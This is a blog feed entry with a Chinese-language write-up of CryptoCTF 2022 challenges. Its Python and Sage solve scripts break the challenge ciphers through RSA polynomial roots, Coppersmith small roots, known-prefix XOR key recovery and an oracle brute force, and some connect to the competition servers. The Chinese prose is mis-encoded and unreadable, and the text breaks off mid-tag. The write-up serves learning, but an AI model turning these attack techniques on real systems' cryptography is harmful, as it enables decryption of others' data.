    <summary type="html">&lt;p&gt;åšäº†å››é“ï¼Œè·å¾—äº†18å&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>CCTF</title>
    <link href="http://sh1k4ku.github.io/2022/07/17/2022/CCTF/"/>
    <id>http://sh1k4ku.github.io/2022/07/17/2022/CCTF/</id>
    <published>2022-07-17T08:56:12.000Z</published>
    <updated>2022-07-19T14:45:31.200Z</updated>
    
    <content type="html"><![CDATA[<p>å¤ç›˜å’¯</p><span id="more"></span><h1 id="WARM-UP"><a href="#WARM-UP" class="headerlink" title="WARM-UP"></a>WARM-UP</h1><h2 id="Mic-Check"><a href="#Mic-Check" class="headerlink" title="Mic Check"></a>Mic Check</h2><p>ç‚¹è¿›å»å°±æœ‰</p><h1 id="EASY"><a href="#EASY" class="headerlink" title="EASY"></a>EASY</h1><h2 id="Klamkin"><a href="#Klamkin" class="headerlink" title="Klamkin"></a>Klamkin</h2><p>æ±‚ä¸€å…ƒä¸€æ¬¡æ–¹ç¨‹çš„è§£ï¼Œç»™äº†ä¸€ç»„xã€yï¼Œç›´æ¥ç§»ä½å°±æœ‰äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;04.cr.yp.toc.tf&#x27;</span>, <span class="number">13777</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[Q]uit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">q = <span class="built_in">int</span>(io.recvline().split()[-<span class="number">1</span>])</span><br><span class="line">r = <span class="built_in">int</span>(io.recvline().split()[-<span class="number">1</span>])</span><br><span class="line">s = <span class="built_in">int</span>(io.recvline().split()[-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(q,r,s)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[Q]uit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;that &#x27;</span>)</span><br><span class="line">    u = io.recvuntil(<span class="string">b&#x27; &#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;-&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    io.recvline()</span><br><span class="line">    <span class="keyword">if</span> u == <span class="string">b&#x27;x&#x27;</span>:</span><br><span class="line">        inv = (gp.invert(r, q) * s) % q</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)) + <span class="string">&#x27;, &#x27;</span> + <span class="built_in">str</span>((inv * (<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)) % q)))</span><br><span class="line">    <span class="keyword">elif</span> u == <span class="string">b&#x27;y&#x27;</span>:</span><br><span class="line">        inv = (gp.invert(s, q) * r) % q</span><br><span class="line">        io.sendline(<span class="built_in">str</span>((inv * (<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)) % q)) + <span class="string">&#x27;, &#x27;</span> +  <span class="built_in">str</span>(<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)))</span><br><span class="line">    io.recvline()</span><br><span class="line"><span class="comment">#CCTF&#123;f1nDin9_In7Eg3R_50Lut1Ons_iZ_in73rEStIn9!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Baphomet"><a href="#Baphomet" class="headerlink" title="Baphomet"></a>Baphomet</h2><p>â€™CCTFâ€˜çˆ†ç ´keyï¼Œæˆªå‰é¢ä¸€éƒ¨åˆ†keyè§£å¯†å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">msg = <span class="string">&#x27;CCTF&#123;&#x27;</span></span><br><span class="line">ba = b64encode(msg.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">baph = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> ba.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> b.islower():</span><br><span class="line">        baph += b.upper()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        baph += b.lower()</span><br><span class="line">baph = baph.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(baph)</span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(baph)):</span><br><span class="line">    key += (baph[i] ^ c[i]).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">key = key[:<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    flag += (c[i] ^ key[i % <span class="built_in">len</span>(key)]).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> f.islower():</span><br><span class="line">        msg += f.upper()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg += f.lower()</span><br><span class="line">msg = msg.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b64decode(msg))</span><br><span class="line"><span class="comment">#b&#x27;CCTF&#123;UpP3r_0R_lOwER_17Z_tH3_Pr0bL3M&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="MEDIUM-EASY"><a href="#MEDIUM-EASY" class="headerlink" title="MEDIUM-EASY"></a>MEDIUM-EASY</h1><h2 id="sots"><a href="#sots" class="headerlink" title="sots"></a>sots</h2><p><code>He who abides far away from his home, is ever longing for the day he shall return.</code></p><p>æ±‚<script type="math/tex">x^2+y^2=n, nå·²çŸ¥</script></p><p>ä¸¢ç•ªå›¾æ–¹ç¨‹ï¼Œå¯ä»¥ç”¨<a href="https://www.alpertron.com.ar/QUAD.HTM">åœ¨çº¿ç½‘ç«™</a>è§£ï¼Œä¹Ÿå¯ä»¥è°ƒåº“two_square()</p><p>æ¢­äº†</p><p>CCTF{3Xpr3sS_4z_Th3_sUm_oF_7w0_Squ4rE5!}</p><h2 id="polyRSA"><a href="#polyRSA" class="headerlink" title="polyRSA"></a>polyRSA</h2><p>ç›´æ¥roots</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">31337</span></span><br><span class="line">n = <span class="number">44538727182858207226040251762322467288176239968967952269350336889655421753182750730773886813281253762528207970314694060562016861614492626112150259048393048617529867598499261392152098087985858905944606287003243</span></span><br><span class="line">c = <span class="number">37578889436345667053409195986387874079577521081198523844555524501835825138236698001996990844798291201187483119265306641889824719989940722147655181198458261772053545832559971159703922610578530282146835945192532</span></span><br><span class="line"></span><br><span class="line">P = PolynomialRing(ZZ, <span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">k = P.gen()</span><br><span class="line">p = k**<span class="number">6</span> + <span class="number">7</span>*k**<span class="number">4</span> - <span class="number">40</span>*k**<span class="number">3</span> + <span class="number">12</span>*k**<span class="number">2</span> - <span class="number">114</span>*k + <span class="number">31377</span></span><br><span class="line">q = k**<span class="number">5</span> - <span class="number">8</span>*k**<span class="number">4</span> + <span class="number">19</span>*k**<span class="number">3</span> - <span class="number">313</span>*k**<span class="number">2</span> - <span class="number">14</span>*k + <span class="number">14011</span></span><br><span class="line">f = p*q -n</span><br><span class="line">x = f.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="comment">#k = 9291098683758154336</span></span><br><span class="line">p = p(x)</span><br><span class="line">q = q(x)</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure><h2 id="infinity-castle"><a href="#infinity-castle" class="headerlink" title="infinity castle"></a>infinity castle</h2><p>diamondæ˜¯å¹³æ–¹ï¼Œtriageæ˜¯ç«‹æ–¹ï¼Œsummarizeæ˜¯å¯¹<script type="math/tex">\sqrt{n}</script>è¿›è¡Œç§¯åˆ†ï¼Œfindæ˜¯è®¡ç®—æ³°å‹’çº§æ•°</p><script type="math/tex; mode=display">summarizeè¿”å›çš„å€¼\approx \frac{\sqrt{2}}{2} +\sqrt{3}+\sqrt{4}+Â·Â·Â·+\frac{\sqrt{n}}{2}\\æ‰€ä»¥æ˜¯\sqrt{n}ä»2åˆ°nçš„ç§¯åˆ†</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2  <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">cip, key</span>):</span></span><br><span class="line">repeation = <span class="number">1</span> + (<span class="built_in">len</span>(cip) // <span class="built_in">len</span>(key))</span><br><span class="line">key = key * repeation</span><br><span class="line">key = key[:<span class="built_in">len</span>(cip)]</span><br><span class="line"></span><br><span class="line">msg = <span class="built_in">bytes</span>([c ^^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(cip, key)])</span><br><span class="line"><span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">diamond</span>(<span class="params">num</span>):</span> <span class="comment">#å¹³æ–¹</span></span><br><span class="line"><span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">triage</span>(<span class="params">num</span>):</span><span class="comment">#ç«‹æ–¹</span></span><br><span class="line"><span class="keyword">return</span> num ** <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">summarize</span>(<span class="params">b</span>):</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>/<span class="number">3</span> * b**(<span class="number">3</span>/<span class="number">2</span>) - <span class="number">2</span>/<span class="number">3</span> * <span class="number">2</span>**(<span class="number">3</span>/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">c0 = <span class="number">194487778980461745865921475300460852453586088781074246328543689440168930873549359227127363759885970436167330043371627413542337857082400024590112412164095470165662281502211335756288082198009158469871465280749846525326701136380764079685636158337203211609233704905784093776008350120607841177268965738426317288541638374141671346404729428158104872411498098187946543666987926130124245185069569476433120128275581891425551325847219504501925282012199947834686225770246801353666030075146469275695499044424390475398423700504158154044180028733800154044746648133536737830623670383925046006108348861714435567006327619892239876863209887013290251890513192375749866675256952802329688897844132157098061758362137357387787072005860610663777569670198971946904157425377235056152628515775755249828721767845990597859165193162537676147173896835503209596955703313430433124688537275895468076469102220355973904702901083642275544954262724054693167603475188412046722656788470695566949847884250306735314144182029335732280420629131990311054229665691517003924788583771265625694414774865289407885678238795596912006567817508035434074250123869676396153982762032750080222602796273083162627489526255501643913672882350236497429678928099868244687228703074267962827621792960</span></span><br><span class="line">c1 = <span class="number">102325064080381160170299055162846304227217463467232681115953623386548494169967745781550171804781503102663445039561476870208178139548389771866145006535051362059443515034504958703659546162037904784821960707630188600064568878674788077706711506213779443920430038560373854184526850365974450688458342413544179732143225845085164110594063440979455274250021370090572731855665413325275414458572412561502408983107820534723804225765540316307539962199024757378469001612921489902325166003841336027940632451584642359132723894801946906069322200784708303615779699081247051006259449466759863245508473429631466831174013498995506423210088549372249221415401309493511477847517923201080509933268996867995533386571564898914042844521373220497356837599443280354679778455765441375957556266205953496871475611269965949025704864246188576674107448587696941054123618319505271195780178776338475090463487960063464172195337956577785477587755181298859587398321270677790915227557908728226236404532915215698698185501562405374498053670694387354757252731874312411228777004316623425843477845333936913444143768519959591070492639650368662529749434618783626718975406802741753688956961837855306815380844030665696781685152837849982159679122660714556706669865596780528277684800454866433826417980212164051043504955615794706595412705883261111953152250227679858538249797999044336210905975316421254442221408945203647754303635775048438188044803368249944201671941949138202928389951227347433255867504906597772044398973241425387514239164853656233776024571606159378910745571588836981735827902305330330946219857271646498602227088657739442867033212012876837654750348578740516798444734534291467314881324902354425889448102902750077077381896216130734894767553834949561471219923459897244690006643798812989271282475503126962274052192342840870308710338336817452628324667507548265612892611100350882163205858101959976</span></span><br><span class="line">enc = <span class="number">122235247669762131006183252122503937958296387791525458429403709404875223067116491817728568224832483391622109986550732469556761300197133827976956875865159629512476600711420561872409721582387803219651736262581445978042694384374119142613277808898398213602093802571586386354257378956087240174787723503606671543195193114158641301908622673736098768829071270132073818245595918660134745516367731595853832524328488074054536278197115937409643221809577554866060292157239061557708159310445977052686561229611117673473208278176118561352693319461471419694590218295911647368543698198762827636021268989705079848502749837879584394379300566277359149621932579222865430374652678738198451655509408564586496375811666876030847654260305392984710580761255795785508407844683687773983669843744274915862335181251050775093896006210092665809300090715190088851654138383362259256212093670748527819287681468901379286722214112321906917311154811516336259463356911326393701445497605365038857575515541024824906818473933597129846235905072394148879079996812146836910199111439031562946495046766063326815863624262541346543552652673629442370320109404700346028639853707278295255350982238521659924641921142615894039995513480511108116053798143154593343124822462519555715118822045</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">pandq = iroot(c1,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> c0 % pandq == <span class="number">0</span></span><br><span class="line">p_q = c0 // pandq</span><br><span class="line">p = (pandq + p_q) // <span class="number">2</span></span><br><span class="line">q = pandq - p</span><br><span class="line"><span class="keyword">assert</span> c1 == (p + q) ** <span class="number">3</span></span><br><span class="line">n = <span class="built_in">int</span>(p * q)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">xor_key = long_to_bytes(<span class="built_in">int</span>(summarize(n)))</span><br><span class="line">enc = long_to_bytes(<span class="built_in">pow</span>(enc, d, n))</span><br><span class="line">flag = xor(enc, xor_key) </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#CCTF&#123;Mix1ng_c4lcUluS_w17h_Numb3r_The0Rry_S33ms_s7r0ng_cRyp70_Sch3m4!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="keydream"><a href="#keydream" class="headerlink" title="keydream"></a>keydream</h2><p>ç»™ä¸¤å¤´çš„copper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line">n = <span class="number">23087202318856030774680571525957068827041569782431397956837104908189620961469336659300387982516148407611623358654041246574100274275974799587138270853364165853708786079644741407579091918180874935364024818882648063256767259283714592098555858095373381673229188828791636142379379969143042636324982275996627729079</span></span><br><span class="line">c = <span class="number">3621516728616736303019716820373078604485184090642291670706733720518953475684497936351864366709813094154736213978864841551795776449242009307288704109630747654430068522939150168228783644831299534766861590666590062361030323441362406214182358585821009335369275098938212859113101297279381840308568293108965668609</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p_high = bytes_to_long(<span class="string">b&#x27;CCTF&#123;it_is_fake_flag_&#x27;</span>)</span><br><span class="line">p_low = bytes_to_long(<span class="string">b&#x27;_90OD_luCk___!!&#125;&#x27;</span>)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = p_high * <span class="number">2</span>^(<span class="number">43</span>*<span class="number">8</span>) + x * <span class="number">2</span>^(<span class="number">16</span>*<span class="number">8</span>) + p_low</span><br><span class="line">roots = f.monic().small_roots(X = <span class="number">2</span>^(<span class="number">27</span>*<span class="number">8</span>), beta = <span class="number">0.4</span>)</span><br><span class="line">p = <span class="built_in">int</span>(f(roots[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">assert</span> n%p == <span class="number">0</span></span><br><span class="line">q = n//p</span><br><span class="line">d = inverse_mod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;Congratz, the flag is: CCTF&#123;h0M3_m4dE_k3Y_Dr1vEn_CrYp7O_5ySTeM!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="jeksign"><a href="#jeksign" class="headerlink" title="jeksign"></a>jeksign</h2><script type="math/tex; mode=display">1337(z^4 - x^2) = 31337(y^2 - z^4)\\a(z^4 - x^2) = b(y^2 - z^4)\\\therefore (a+b)z^4 = ax^2+by^2\\ä»¤x=y=z^2ï¼Œå¾—åˆ°æ’ç­‰å¼</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">nc = remote(<span class="string">&#x27;02.cr.yp.toc.tf&#x27;</span>, <span class="number">17113</span>)</span><br><span class="line">x = <span class="number">30</span></span><br><span class="line">nc.recvuntil(<span class="string">b&#x27;-bit: \n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    z = randint(<span class="number">2</span> ** (x-<span class="number">1</span>), <span class="number">2</span> ** x)</span><br><span class="line">    <span class="built_in">print</span>(z)</span><br><span class="line">    nc.sendline(<span class="built_in">str</span>(z**<span class="number">2</span>)+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(z**<span class="number">2</span>)  + <span class="string">&#x27;,&#x27;</span> + <span class="built_in">str</span>(z))</span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line">    nc.recvline()</span><br><span class="line"><span class="comment">#CCTF&#123;4_diOpH4nT1nE_3Qua7i0n__8Y__Jekuthiel_Ginsbur!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="volgo"><a href="#volgo" class="headerlink" title="volgo"></a>volgo</h2><p>æ˜æ–‡å¯†æ–‡ä¸€ä¸€å¯¹åº”ï¼Œç›´æ¥çˆ†ç ´</p><p>ä¸‹é¢çš„expæ˜¯è‹æ°¨é…¸å¸ˆå‚…çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line"></span><br><span class="line">ct = <span class="string">&#x27;NUYXA FATCL LJSVD KOLWM NWZUG JZDPY JGOSL CBRGO BAMKL BXDZR BLXDU KUNQE CWEUO SPOZR VOJMM POXCR RPNXX SGVHW TGOWJ BDOGF AHVWF WPZGR UQKUE HASEF GKFFA QOPNQ TESLZ FACTJ JPSPL DNZYN CXSFZ&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rua</span>(<span class="params">c, i</span>):</span></span><br><span class="line">    pre = <span class="string">&quot;A&quot;</span> * i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">        cipher = requests.post(<span class="string">&quot;http://03.cr.yp.toc.tf:11117/m209/encipher&quot;</span>,</span><br><span class="line">                               data=&#123;</span><br><span class="line">                                   <span class="string">&quot;plain&quot;</span>: pre + ch</span><br><span class="line">                               &#125;).json()[<span class="string">&quot;cipher&quot;</span>]</span><br><span class="line"></span><br><span class="line">        cipher = cipher.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)[<span class="number">10</span>:-<span class="number">10</span>]        <span class="comment"># remove head and tail</span></span><br><span class="line">        <span class="built_in">print</span>(cipher)</span><br><span class="line">        <span class="keyword">if</span> cipher[i] == c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;flag[i] is&#x27;</span>, ch)</span><br><span class="line">            <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(ct):</span><br><span class="line">    flag += rua(c, i)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯å‘ç°äº†è§„å¾‹çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ciphertext</span>(<span class="params">s</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://03.cr.yp.toc.tf:11117/m209/encipher&quot;</span></span><br><span class="line">    data = &#123; <span class="string">&quot;plain&quot;</span>: s &#125;</span><br><span class="line">    res = requests.post(url, data)</span><br><span class="line">    <span class="keyword">return</span> json.loads(res.text)[<span class="string">&quot;cipher&quot;</span>]</span><br><span class="line"></span><br><span class="line">st = <span class="string">&quot;IISNJ IFFAA TYPMO WDJHA ZMNBD LKUAY TYPVD UGAYU OQMOO YRVUS SLFZI IXKVW LYUGT JWTYV XNEYU HLQVV IXUMJ BKNUQ WMLQT QKIWV UXOCA CVSPG UKJQG XCSFI RJEKU BWLBM AVRFW DMOPT VFXTD VROND XSEHF ZLWEJ VOVSX IISNJ IFFAA&quot;</span></span><br><span class="line"></span><br><span class="line">en = <span class="string">&quot;A&quot;</span> * <span class="number">155</span></span><br><span class="line">en = get_ciphertext(en)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(st))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(en))</span><br><span class="line">res = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(st)):</span><br><span class="line">    <span class="keyword">if</span> st[i] == en[i] <span class="keyword">and</span> st[i] == <span class="string">&quot; &quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    cc = <span class="built_in">bytes</span>([(<span class="built_in">ord</span>(en[i]) - <span class="built_in">ord</span>(st[i])) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Z&quot;</span> == cc:</span><br><span class="line">        res += <span class="string">b&quot; &quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += cc</span><br><span class="line"><span class="built_in">print</span>(res)  </span><br></pre></td></tr></table></figure><p>CCTF{OOJMPMDDIXCLNNWFTEJUMFXKBRVVMOPSLSSLUTXVDVNDMYYPHPWFJRNJBVBOMUYR}</p><h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="Aniely"><a href="#Aniely" class="headerlink" title="Aniely"></a>Aniely</h2><p>key = passphrase^flag</p><p>enc = passphrase ^ E(key)^rand</p><p>rand = urandom(2) * 16</p><p>flagå¼€å¤´ä¸¤å­—èŠ‚ä¸ºâ€™CCâ€™</p><p>å› æ­¤randå¯æ±‚</p><h2 id="Diploma"><a href="#Diploma" class="headerlink" title="Diploma"></a>Diploma</h2><h2 id="Oak-land"><a href="#Oak-land" class="headerlink" 